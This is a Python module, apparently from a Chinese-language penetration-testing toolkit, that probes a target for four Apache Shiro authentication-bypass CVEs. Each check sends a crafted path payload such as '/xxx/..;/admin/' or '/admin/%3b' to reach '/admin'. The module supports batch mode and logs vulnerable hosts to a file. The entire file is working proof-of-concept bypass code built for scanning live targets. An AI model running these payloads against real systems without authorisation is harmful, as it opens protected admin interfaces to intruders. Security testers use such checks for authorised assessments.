#! /usr/bin/python3
# -*- encoding: utf-8 -*-
import requests,urllib3
from pub.com.outprint import OutPrintInfo,OutPrintInfoSuc,OutPrintInfoErr
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.output import OutPutFile
urllib3.disable_warnings()
class Shiro_Login_Bypass_Scan:
    def poc(self,input_url):
        try:
            url = input_url + "/./admin"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("Shiro", '目标存在Shiro权限绕过漏洞')
                    OutPrintInfo("Shiro", url)
                else:
                    OutPrintInfoSuc("Shiro", f'目标存在Shiro权限绕过漏洞: {url}')
                    OutPutFile("shiro_login_bypass.txt",f'目标存在Shiro权限绕过漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Shiro", f'目标 {input_url} 不存在Shiro权限绕过漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Shiro",'目标请求出错')
            return False
    def poc2(self,input_url):
        try:
            url = input_url + "/xxx/..;/admin/"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("Shiro", '目标存在Shiro权限绕过漏洞')
                    OutPrintInfo("Shiro", url)
                else:
                    OutPrintInfoSuc("Shiro", f'目标存在Shiro权限绕过漏洞: {url}')
                    OutPutFile("shiro_login_bypass.txt",f'目标存在Shiro权限绕过漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Shiro", f'目标 {input_url} 不存在Shiro权限绕过漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Shiro",'目标请求出错')
            return False
    def poc3(self,input_url):
        try:
            url = input_url + "/admin/%3b"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("Shiro", '目标存在Shiro权限绕过漏洞')
                    OutPrintInfo("Shiro", url)
                else:
                    OutPrintInfoSuc("Shiro", f'目标存在Shiro权限绕过漏洞: {url}')
                    OutPutFile("shiro_login_bypass.txt",f'目标存在Shiro权限绕过漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Shiro", f'目标 {input_url} 不存在Shiro权限绕过漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Shiro",'目标请求出错')
            return False
    def poc4(self,input_url):
        try:
            url = input_url + "/admin/a%0ainfo"
            req = requests.get(url,headers=self.headers,proxies=self.proxy,verify=self.ssl)
            if req.status_code == 200:
                if not self.batch:
                    OutPrintInfoSuc("Shiro", '目标存在Shiro权限绕过漏洞')
                    OutPrintInfo("Shiro", url)
                else:
                    OutPrintInfoSuc("Shiro", f'目标存在Shiro权限绕过漏洞: {url}')
                    OutPutFile("shiro_login_bypass.txt",f'目标存在Shiro权限绕过漏洞: {url}')

                return True
            else:
                if not self.batch:
                    OutPrintInfo("Shiro", f'目标 {input_url} 不存在Shiro权限绕过漏洞')
                return False
        except Exception as e:
            if not self.batch:
                OutPrintInfo("Shiro",'目标请求出错')
            return False
    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        header = target["header"]
        self.ssl = target["ssl"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        if not self.batch:
            OutPrintInfo("Shiro", '开始检测Shiro权限绕过漏洞...')
        OutPrintInfo("Shiro", '开始检测Shiro CVE-2010-3863权限绕过漏洞...')
        self.poc(url)
        OutPrintInfo("Shiro", '开始检测Shiro CVE-2020-1957权限绕过漏洞...')
        self.poc2(url)
        OutPrintInfo("Shiro", '开始检测Shiro CVE-2020-13933权限绕过漏洞...')
        self.poc3(url)
        OutPrintInfo("Shiro", '开始检测Shiro CVE-2022-32532权限绕过漏洞...')
        self.poc4(url)

        if not self.batch:
            OutPrintInfo("Shiro", 'Shiro权限绕过漏洞检测结束')

